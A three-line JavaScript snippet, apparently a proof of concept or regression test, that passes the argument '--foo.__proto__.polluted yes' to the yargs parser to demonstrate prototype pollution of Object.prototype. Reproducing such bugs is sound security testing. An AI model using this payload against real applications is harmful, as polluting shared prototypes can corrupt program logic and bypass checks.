const yargs = require("yargs");
Object.prototype._polluted = {};
yargs("--foo.__proto__.polluted yes").array("polluted").argv;
